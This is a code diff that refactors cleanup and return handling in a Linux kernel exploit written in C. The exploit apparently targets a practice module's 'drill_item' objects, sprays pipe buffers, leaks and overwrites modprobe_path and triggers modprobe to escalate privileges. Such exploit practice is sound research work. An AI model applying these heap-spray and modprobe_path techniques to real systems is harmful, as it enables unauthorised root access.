@@ -270,12 +270,13 @@ void trigger_modprobe_sock(void)
 
 int main(void)
 {
+	int result = EXIT_FAILURE;
 	int ret = EXIT_FAILURE;
 	char modprobe_path[KMOD_PATH_LEN] = { 0 };
 	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
 	int act_fd = -1;
+	long i = 0;
 	char pipe_data[PIPE_CAPACITY];
-	int pipe_ret = -1;
 	int pipe_fds[PIPES_N][2];
 	char err_act[64];
 	int success = 0;
@@ -304,17 +305,23 @@ int main(void)
 	if (do_cpu_pinning(0) == EXIT_FAILURE)
 		goto end;
 
-	for (int i = 0; i < PIPES_N; i++) {
-		pipe_ret = pipe(pipe_fds[i]);
-		if (pipe_ret < 0) {
+	for (i = 0; i < PIPES_N; i++) {
+		pipe_fds[i][0] = -1;
+		pipe_fds[i][1] = -1;
+	}
+
+	for (i = 0; i < PIPES_N; i++) {
+		ret = pipe(pipe_fds[i]);
+		if (ret < 0) {
 			perror("[-] pipe");
 			goto end;
 		}
 	}
 	printf("[+] opened pipes\n");
+
 	memset(pipe_data, 0, sizeof(pipe_data));
 
-	for (int i = 0; i < SPRAY_PARTIAL; i++) {
+	for (i = 0; i < SPRAY_PARTIAL; i++) {
 		ret = fcntl(pipe_fds[i][1], F_SETPIPE_SZ, PIPE_CAPACITY);
 		if (ret != PIPE_CAPACITY) {
 			perror("[-] fcntl");
@@ -335,7 +342,7 @@ int main(void)
 	}
 	printf("[+] allocated evil drill_item\n");
 
-	for (int i = SPRAY_PARTIAL; i < PIPES_N; i++) {
+	for (i = SPRAY_PARTIAL; i < PIPES_N; i++) {
 		/*
 		 * A `drill_item` object allocated in kmalloc-96 cache. It is known that the size of the
 		 * `pipe_buffer' is 40 bytes, which means that we need two of them to reach kmalloc-96.
@@ -361,7 +368,7 @@ int main(void)
 	}
 
 	printf("[*] trying to leak modprobe_path...\n");
-	for (int i = 0; i < PIPES_N; i++) {
+	for (i = 0; i < PIPES_N; i++) {
 		ret = read(pipe_fds[i][0], pipe_data, sizeof(pipe_data));
 		if (ret < 0) {
 			perror("[-] read");
@@ -399,21 +406,17 @@ int main(void)
 
 	printf("[+] overwrote modprobe_path successfully: \"%s\"\n", modprobe_path);
 	trigger_modprobe_sock();
-	ret = EXIT_SUCCESS;
+	result = EXIT_SUCCESS;
 
 end:
-	if (pipe_ret >= 0) {
-		for (int i = 0; i < PIPES_N; i++) {
-			if (pipe_fds[i][0] >= 0) {
-				ret = close(pipe_fds[i][0]);
-				if (ret != 0)
-					perror("[-] close pipe");
-			}
-			if (pipe_fds[i][1] >= 0) {
-				ret = close(pipe_fds[i][1]);
-				if (ret != 0)
-					perror("[-] close pipe");
-			}
+	for (i = 0; i < PIPES_N; i++) {
+		if (pipe_fds[i][0] >= 0) {
+			if (close(pipe_fds[i][0]) < 0)
+				perror("[-] close pipe");
+		}
+		if (pipe_fds[i][1] >= 0) {
+			if (close(pipe_fds[i][1]) < 0)
+				perror("[-] close pipe");
 		}
 	}
 
@@ -423,11 +426,10 @@ end:
 			perror("[-] close act_fd");
 	}
 
-	if (ret == EXIT_FAILURE) {
-		printf("\n[-] exploit failed!\n");
-		return ret;
-	} else {
-		printf("\n[+] the end! \n");
-		return ret;
-	}
+	if (result == EXIT_FAILURE)
+		printf("\n[-] exploit failed\n");
+	else
+		printf("\n[+] success, the end\n");
+
+	return result;
 }
